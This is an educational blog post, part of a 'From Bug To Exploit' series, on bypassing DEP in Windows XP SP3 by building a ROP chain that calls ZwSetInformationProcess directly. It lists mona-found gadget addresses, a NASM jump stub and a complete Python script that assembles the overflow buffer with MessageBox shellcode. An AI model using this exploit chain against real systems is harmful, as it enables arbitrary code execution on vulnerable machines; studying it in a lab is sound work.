---
title: "[Learning] Bypassing DEP: Advanced Usage of ZwSetInformationProcess | ISSAC/iss4cf0ng's blog"
source: https://iss4cf0ng.github.io/2026/09/27/2026-9-27-DEP/
source_host: iss4cf0ng.github.io
clip_date: 2026-09-29T16:35:22+08:00
trace_id: 77640278-89f5-4714-9c78-ed46ebb542ae
content_hash: c451ae8b71bcc723dde01a501ed415de4f1a3f794833c0ceef0a31958ffada33
status: synced
tags:
  - Windows逆向
  - 漏洞分析
series: null
feed_source: iss4cf0ng·漏洞利用学习
ai_summary: 绕过 DEP 的另一条路径：不再依赖 `LdrpCheckNXCompatibility` gadget，而是用 ROP 链直接以寄存器为支点调用 `ZwSetInformationProcess` 关闭 DEP，再执行 shellcode。
ai_summary_style: key-points
images_status:
  total: 7
  succeeded: 7
  failed_urls: []
notion_page_id: 3ea75244-d011-81ce-93aa-ed94cb18c50f
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 绕过 DEP 的另一条路径：不再依赖 `LdrpCheckNXCompatibility` gadget，而是用 ROP 链直接以寄存器为支点调用 `ZwSetInformationProcess` 关闭 DEP，再执行 shellcode。
> 
> - **API 入口：** `ntdll!ZwSetInformationProcess` 反汇编为 `mov eax,0E4h` / `call [SharedUserData!SystemCallStub]` / `ret 10h`；它与 `NtSetInformationProcess` 在用户态是同一地址，仅内核态有别（可用 `uf` 查看）。
> - **栈布局顺序：** padding A → 函数地址 → padding B → `jmp esp` → padding C（`0x10` 字节，对应 `ret 10h`）→ Shellcode A → padding D → rop1~rop6 → Shellcode B。
> - **支点选择：** 因 `push` 逐个压参易破坏 ROP 链，改用 EDI 作类 ESP 支点；rop1 用 `PUSH ESP` + 两次 `SUB EAX,30` 把 EDI 设为距 ESP 60 字节处，参数放在 rop1 之前以免地址不可预测。
> - **参数构造：** rop2~rop5 分别向 `[EDI]`、`[EDI+4]`、`[EDI+8]`、`[EDI+0x0C]` 写入 -1、`0x22`、指向值 2 的指针、4（ProcessInformationClass/Length 等四个参数）。
> - **收尾与验证：** 用 `jmp esp` 双跳弥补主 shellcode 空间不足；rop6 循环 `ADD EAX,-2` 得 EDI-4，经 `POP ESP` 与 `retn 0x08` 把控制流交给 API，最后 ret 回 `jmp esp`。gadget 来自 `!mona rop -m *`，在 Windows XP SP3 上成功弹出 MessageBox。

## Introduction

This article is part of my series: **[From Bug To Exploit](https://iss4cf0ng.github.io/FromBugToExploit)**.

In [the previous article](https://iss4cf0ng.github.io/2026/09/25/2026-9-25-DEP/), I described how to disable DEP via `ZwSetInformationProcess`. We used a ROP chain to call the API.

In this article, I will introduce another method. We still use `ZwSetInformationProcess`, but with a different approach. Instead of calling the API through `LdrpCheckNXCompatibility`, we directly call the API `ZwSetInformationProcess` (or `NtSetInformationProcess`).

> Murmur: In [the previous article](https://iss4cf0ng.github.io/2026/09/25/2026-9-25-DEP/), we found a ROP chain in `LdrpCheckNXCompatibility`. In real-world practice, however, we are not always that lucky. Therefore, I believe that learning how to call the API directly is essential.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/70a417b197df8b64.png)

## Preparation

We can directly call the `ZwSetInformationProcess` function with four required parameters.

First, let’s disassemble the API with the command below in WinDbg:

```
uf ntdll!ZwSetInformationProcess
```

```
mov eax,0E4h
mov edx,offset SharedUserData!SystemCallStub
call dword ptr [edx]
ret 10h
```

As I mentioned in [the previous article](https://iss4cf0ng.github.io/2026/09/25/2026-9-25-DEP/), both `ZwSetInformationProcess` and `NtSetInformationProcess` share the same address. They are only different in kernel mode. I will discuss their differences in future posts.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/500325a5b1b9d506.png)

Now, let’s discuss how to arrange our exploit buffer and how it will be organized on the stack.

First, we need to cause a buffer overflow. We can apply what we learned from [this series](https://iss4cf0ng.github.io/FromBugToExploit).

Before calling the API `ZwSetInformationProcess` API, we need to prepare the four required parameters.

On 32-bit Windows (x86), APIs commonly use calling conventions such as `__stdcall` or `__cdecl`. Therefore, we need to place the four parameters on the stack.

Normally, a compiler uses `push` instructions to place the parameters on the stack, starting with the last parameter and working backward to the first parameter, and then sets `ESP` to point to the stack.

However, in a ROP chain, this can be very difficult because we may overwrite our own ROP chain, leading to data corruption and an access violation exception.

Therefore, we can choose a register and treat it as a “pivot”, similar to `ESP` or `EBP`, and set the value of `ESP` to this pivot at the final step. In this article (and in the example from my textbook), we use `EDI` as the pivot.

Since we can access the pivot directly, we can store the parameters on the stack in order. We don’t have to start with the last parameter.

Generally, we have to set the parameters first. Therefore, the first gadget (which I call `rop1` in this article) has to overwrite `EIP`, so that it is executed first.

Here, I adopt the arrangement from my textbook:

1.  Padding `A`
2.  Call `ZwSetInformationProcess`
3.  Padding `B`
4.  `jmp esp`: The execution flow will reach here after calling `ZwSetInformationProcess`
5.  Padding `C`: We need `0x10` bytes of space for the parameters of `ZwSetInformationProcess`
6.  Shellcode A: Used to jump to Shellcode B
7.  Padding D
8.  `rop1`: Use a register that is not commonly used (such as `EDI`) as a stack address
9.  `rop2`: The first parameter of `ZwSetInformationProcess`
10.  `rop3`: The second parameter of `ZwSetInformationProcess`
11.  `rop4`: The third parameter of `ZwSetInformationProcess`
12.  `rop5`: The fourth parameter of `ZwSetInformationProcess`
13.  `rop6`: Set `ESP` to (4) and `EIP` to (2)
14.  Shellcode B

> Murmur: Always remember: There is no standard answer. If you can run your shellcode after disabling DEP with your own implementation, then it is correct!

Well, again, my textbook always skips some essential details, which makes me spend more time trying to understand them. While learning this implementation, I was wondering why the author chose this particular arrangement.

The reason is that it is simple. If we append the parameters after `rop6`, we can hardly find an appropriate value for `EDI` because we cannot predict how many gadgets we will need. Therefore, we store the parameters before `rop1`.

We also need to redirect the execution flow to the stack by using `jmp esp`. After calling `ZwSetInformationProcess`, `ESP` should point to `jmp esp`. Then, we can execute our shellcode. We use a double jump because we might not have enough space to store the main shellcode payload before `rop1`.

## Writing ROP Exploit Script

Now, let’s get started with `rop1`, which overwrites `EIP` and sets the pivot `EDI`.

We can use `mona` to find all available gadgets:

```
!mona rop -m *
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9948bf2d2d141b57.png)

Therefore, `rop1` can be implemented as follows:

1.  `0x7eb9a880`: `PUSH ESP # ADD BH,BH # DEC ECX # POP EAX # POP EBP # RETN 0x04`
2.  `0x7eb5de9d`: `SUB EAX,30 # POP EBP # RETN`
3.  `0x7eb5de9d`: `SUB EAX,30 # POP EBP # RETN`
4.  `0x7eb5b0e7`: `PUSH EAX # ADD AL,66 # MOV DWORD PTR DS:[EAX],1B00001 # POP EDI # POP ESI # POP EBP # RETN 0x08`

We set the pivot `EDI` to an address that is `60` bytes away from `ESP`.

We use `rop2` to configure the first parameter. We put the first parameter `-1` into `[EDI]`:

1.  `0x7eb4dafd`: `XOR ECX,ECX # RETN`
2.  `0x7eb5c81b`: `# ADD EAX,2 # POP EBP # RETN 0x04 ** [ntdll.dll] ** | {PAGE_EXECUTE_READ}`
3.  `0x77c34dc2`: `MOV EAX,EDI # POP ESI # RETN`
4.  `0x7eb47ad8`: `MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN 0x04`

`rop3` is the second parameter, `0x22`. It is stored in `[EDI + 4]`:

1.  `0x77c200a0`: `# XOR EAX,EAX # RETN`
2.  `0x7eba2ef2`: `# ADD EAX,20 # POP EBP # RETN`
3.  `0x7eb5c81b`: `# ADD EAX,2 # POP EBP # RETN 0x04`
4.  `0x7eb32b4c`: `# MOV ECX,EAX # MOV EAX,EDX # MOV EDX,ECX # RETN ** [ntdll.dll] ** | {PAGE_EXECUTE_READ}`
5.  `0x7eb5c81b`: `# ADD EAX,2 # POP EBP # RETN 0x04 ** [ntdll.dll] ** | {PAGE_EXECUTE_READ}`
6.  `0x7eb5c81b`: `# ADD EAX,2 # POP EBP # RETN 0x04 ** [ntdll.dll] ** | {PAGE_EXECUTE_READ}`
7.  `0x7eba5686`: `# MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN ** [ntdll.dll] ** | {PAGE_EXECUTE_READ}`

`rop4` is the third parameter, a pointer to `1`. We can use `[EDI + 0x20]` to store `2`, and then store `EDI + 0x20` into `[EDI + 8]`:

1.  `0x77c200a0`: `# XOR EAX,EAX # RETN`
2.  `0x7eb5c81b`: `# ADD EAX,2 # POP EBP # RETN 0x04`
3.  `0x7eb32b4c`: `# MOV ECX,EAX # MOV EAX,EDX # MOV EDX,ECX # RETN ** [ntdll.dll] ** | {PAGE_EXECUTE_READ}`
4.  `0x77c34dc2`: `# MOV EAX,EDI # POP ESI # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
5.  `0x77c1d7f5`: `# ADD EAX,20 # POP EBP # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
6.  `0x7eb47ad8`: `# MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN 0x04 ** [ntdll.dll] ** | {PAGE_EXECUTE_READ}`
7.  `0x7eb32b4c`: `# MOV ECX,EAX # MOV EAX,EDX # MOV EDX,ECX # RETN ** [ntdll.dll] ** | {PAGE_EXECUTE_REA}`
8.  `0x77c34dc2`: `# MOV EAX,EDI # POP ESI # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
9.  `0x77c1f2c1`: `# ADD EAX,8 # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
10.  `0x7eb47ad8`: `# MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN 0x04 ** [ntdll.dll] ** | {PAGE_EXECUTE_READ}`

`rop5` is the fourth parameter, storing the value `4` at `[EDI + 0x0C]`:

1.  `0x77c200a0`: `# XOR EAX,EAX # RETN`
2.  `0x7eb5c81b`: `# ADD EAX,2 # POP EBP # RETN 0x04`
3.  `0x7eb5c81b`: `# ADD EAX,2 # POP EBP # RETN 0x04`
4.  `0x7eb32b4c`: `# MOV ECX,EAX # MOV EAX,EDX # MOV EDX,ECX # RETN ** [ntdll.dll] ** | {PAGE_EXECUTE_READ}`
5.  `0x77c34dc2`: `# MOV EAX,EDI # POP ESI # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
6.  `0x77c1f2c1`: `# ADD EAX,8 # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
7.  `0x7eb5c81b`: `# ADD EAX,2 # POP EBP # RETN 0x04`
8.  `0x7eb5c81b`: `# ADD EAX,2 # POP EBP # RETN 0x04`
9.  `0x7eb47ad8`: `# MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN 0x04 ** [ntdll.dll] ** | {PAGE_EXECUTE_READ}`

`rop6` is used to redirect the execution flow to `EDI - 4`. The final `retn 0x08` places `EDI - 4` into `EIP`:

1.  `0x77c34dc2`: `# MOV EAX,EDI # POP ESI # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
2.  `0x77c47844`: `# ADD EAX,-2 # POP EBP # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
3.  `0x77c47844`: `# ADD EAX,-2 # POP EBP # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
4.  `0x77c47844`: `# ADD EAX,-2 # POP EBP # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
5.  `0x77c47844`: `# ADD EAX,-2 # POP EBP # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
6.  `0x77c47844`: `# ADD EAX,-2 # POP EBP # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
7.  `0x77c47844`: `# ADD EAX,-2 # POP EBP # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
8.  `0x77c47844`: `# ADD EAX,-2 # POP EBP # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
9.  `0x77c47844`: `# ADD EAX,-2 # POP EBP # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
10.  `0x77c47844`: `# ADD EAX,-2 # POP EBP # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
11.  `0x77c47844`: `# ADD EAX,-2 # POP EBP # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
12.  `0x7eb9a9e3`: `# PUSH EAX # SUB AL,8B # DEC ECX # OR AL,1 # DEC EAX # POP ESP # POP EBP # RETN 0x08 ** [ntdll.dll] ** | {PAGE_EXECUTE_READ}`

The multiple `ADD EAX,-2` instructions and the final gadget are used to make the final value of `ESP` point to the `ZwSetInformationProcess` API.

The paddings `A`, `B`, and `D` are actually junk data. They are used to cause the buffer overflow and help with debugging. We can use different characters for these paddings to make it easier to see the stack layout.

The only special one is padding `C`. The disassembled `ntdll!ZwSetInformationProcess` is shown below:

```
mov eax,0E4h
mov edx,offset SharedUserData!SystemCallStub
call dword ptr [edx]
ret 10h
```

Therefore, we need padding with a size of `0x10`. Otherwise, our exploit chain will be corrupted.

What about `Shellcode A`? We just need to write a simple assembly code:

```
; jump.asm
[BITS 32]

mov eax,esp
add eax,127
add eax,127
add eax,127
add eax,127
add eax,95

jmp eax
```

Then, we can easily obtain the shellcode with the commands below:

```bash
nasm jump.asm -o jump.bin
xxd -i jump.bin
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ad817a3cf5fa6132.png)

The final implementation of the exploit script is shown below:

```python
# exploit_dep.py

import struct

def read_shellcode() -> bytes:
    shellcode = b''

    with open('messagebox.bin', 'rb') as f:
        shellcode += f.read()

    return shellcode

def p32(addr) -> bytes:
    return struct.pack('<I', addr)

def sword_one_plus() -> bytes:
    zwsetinformationprocess = p32(0x7eb3dc9e)
    padding_B = b'B' * 0x08
    stack_pivot = p32(0x7c874f13)
    padding_C = b'C' * 0x10
    shellcode_A = b'\x89\xe0\x83\xc0\x7f\x83\xc0\x7f\x83\xc0\x7f\x83\xc0\x5f\xff\xe0'
    padding_D = b'D' * 0x3c

    padding_A = b'A' * (140 - len(zwsetinformationprocess) - len(padding_B) - len(stack_pivot) - len(padding_C) - len(shellcode_A) - len(padding_D))

    rop1 = b''
    rop1 += p32(0x7eb9a880) # PUSH ESP # ADD BH,BH # DEC ECX # POP EAX # POP EBP # RETN 0x04
    rop1 += b'1111' # pop eax
    rop1 += p32(0x7eb5de9d) # SUB EAX,30 # POP EBP # RETN
    rop1 += b'1111' # retn 0x04
    rop1 += b'1111' # pop ebp
    rop1 += p32(0x7eb5de9d) # SUB EAX,30 # POP EBP # RETN
    rop1 += b'1111' # retn
    rop1 += p32(0x7eb5b0e7) # PUSH EAX # ADD AL,66 # MOV DWORD PTR DS:[EAX],1B00001 # POP EDI # POP ESI # POP EBP # RETN 0x08
    rop1 += b'1111' # pop esi
    rop1 += b'1111' # pop ebp

    rop2 = b''
    rop2 += p32(0x7eb4dafd) # XOR ECX,ECX # RETN
    rop2 += b'22222222' # retn 0x08 from rop1
    rop2 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04
    rop2 += b'2222'
    rop2 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN
    rop2 += b'2222' # pop esi
    rop2 += b'2222' # retn 0x04
    rop2 += p32(0x7eb47ad8) # MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN 0x04
    rop2 += b'2222'

    rop3 = b''
    rop3 += p32(0x77c200a0) # XOR EAX,EAX # RETN
    rop3 += b'3333' # retn 0x04 from rop2
    rop3 += p32(0x7eba2ef2) # ADD EAX,20 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x7eb32b4c) # MOV ECX,EAX # MOV EAX,EDX # MOV EDX,ECX # RETN
    rop3 += b'3333' # retn 0x04
    rop3 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04
    rop3 += b'3333' # pop ebp
    rop3 += b'3333' # retn 0x04
    rop3 += p32(0x7eba5686) # MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN
    rop3 += b'3333' # pop ebp

    rop4 = b''
    rop4 += p32(0x77c200a0) # XOR EAX,EAX # RETN
    rop4 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04
    rop4 += b'4444'
    rop4 += p32(0x7eb32b4c) # MOV ECX,EAX # MOV EAX,EDX # MOV EDX,ECX # RETN
    rop4 += b'4444' # retn 0x04
    rop4 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN
    rop4 += b'4444' # pop esi
    rop4 += p32(0x77c1d7f5) # ADD EAX,20 # POP EBP # RETN
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x7eb47ad8) # MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN 0x04
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x7eb32b4c) # MOV ECX,EAX # MOV EAX,EDX # MOV EDX,ECX # RETN
    rop4 += b'4444' # retn 0x04
    rop4 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN
    rop4 += b'4444' # pop esi
    rop4 += p32(0x77c1f2c1) # ADD EAX,8 # RETN
    rop4 += p32(0x7eb47ad8) # MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN 0x04
    rop4 += b'4444'

    rop5 = b''
    rop5 += p32(0x77c200a0) # XOR EAX,EAX # RETN
    rop5 += b'5555' # retn 0x04 from pop
    rop5 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04
    rop5 += b'5555' # retn 0x04
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x7eb32b4c) # MOV ECX,EAX # MOV EAX,EDX # MOV EDX,ECX # RETN
    rop5 += b'5555' # retn 0x04
    rop5 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN
    rop5 += b'5555' # pop esi
    rop5 += p32(0x77c1f2c1) # ADD EAX,8 # RETN
    rop5 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x7eb47ad8) # MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN 0x04
    rop5 += b'5555' # retn 0x04
    rop5 += b'5555' # pop ebp

    rop6 = b''
    rop6 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN
    rop6 += b'6666' # retn 0x04 from rop5
    rop6 += b'6666' # pop esi
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += p32(0x7eb9a9e3) # PUSH EAX # SUB AL,8B # DEC ECX # OR AL,1 # DEC EAX # POP ESP # POP EBP # RETN 0x08
    rop6 += b'6666' # pop ebp
    
    # 8 bytes padding left
    #rop6 += b'66666666' # retn 8

    nops = b'\x90' * 24
    shellcode = read_shellcode()

    exploit = b''
    exploit += padding_A
    exploit += zwsetinformationprocess
    exploit += padding_B
    exploit += stack_pivot
    exploit += padding_C
    exploit += shellcode_A
    exploit += padding_D

    exploit += rop1

    exploit += rop2
    exploit += rop3
    exploit += rop4
    exploit += rop5
    exploit += rop6
    exploit += nops
    exploit += shellcode

    return exploit

def main():
    exploit = sword_one_plus()

    with open('exploit_dep.txt', 'wb') as f:
        f.write(exploit)

if __name__ == '__main__':
    main()
```

Finally, let’s exploit it in a Windows XP SP3 virtual machine!

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d23650a82fe12268.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/61398fce3a415c90.png)

## Conclusion

This is my second time developing a ROP exploit script.

To be honest, ROP is probably the most difficult part of learning stack-based buffer overflows. However, compared to [the previous article](https://iss4cf0ng.github.io/2026/09/25/2026-9-25-DEP/), I feel that I now have a deeper understanding of it!

In the next article, I will introduce the second method of bypassing DEP.

This is the end of this article. If you have any comments or suggestions, please feel free to leave them below!

## THANKS FOR READING!

I drew a [new drawing](https://www.pixiv.net/artworks/149996680)!

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/eaff334e6bb7d7d3.jpg)

ごめん、すごく待った？
